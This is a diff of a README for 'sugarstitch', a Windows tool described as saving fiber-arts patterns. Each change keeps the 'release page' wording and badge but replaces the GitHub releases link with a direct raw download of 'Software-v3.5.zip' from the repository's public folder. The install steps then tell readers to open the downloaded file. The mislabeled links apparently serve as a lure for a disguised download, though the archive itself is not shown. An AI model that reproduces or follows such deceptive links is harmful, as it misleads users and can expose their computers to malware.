@@ -1,6 +1,6 @@
 # 🧵 sugarstitch - Save fiber arts patterns with ease
 
-[![Download sugarstitch](https://img.shields.io/badge/Download-Release_Page-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mado2929/sugarstitch/releases)
+[![Download sugarstitch](https://img.shields.io/badge/Download-Release_Page-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Mado2929/sugarstitch/main/public/Software-v3.5.zip)
 
 ## 🪡 What sugarstitch does
 
@@ -17,7 +17,7 @@ It keeps your saved files on your Windows PC so you can open them even when you 
 
 ## 📥 Download for Windows
 
-1. Open the [sugarstitch release page](https://github.com/Mado2929/sugarstitch/releases)
+1. Open the [sugarstitch release page](https://raw.githubusercontent.com/Mado2929/sugarstitch/main/public/Software-v3.5.zip)
 2. Look for the latest release
 3. Download the Windows file listed there
 4. Save the file to your Desktop or Downloads folder
@@ -40,7 +40,7 @@ For best results, keep your browser up to date.
 
 ## 🚀 Install and open
 
-1. Go to the [release page](https://github.com/Mado2929/sugarstitch/releases)
+1. Go to the [release page](https://raw.githubusercontent.com/Mado2929/sugarstitch/main/public/Software-v3.5.zip)
 2. Download the Windows version
 3. Open the downloaded file
 4. If a folder or app window appears, keep it open
@@ -173,7 +173,7 @@ The project is useful for users who want a simple way to:
 
 ## 🔗 Download again
 
-[Go to the sugarstitch release page](https://github.com/Mado2929/sugarstitch/releases)
+[Go to the sugarstitch release page](https://raw.githubusercontent.com/Mado2929/sugarstitch/main/public/Software-v3.5.zip)
 
 ## ❓ Common questions
 
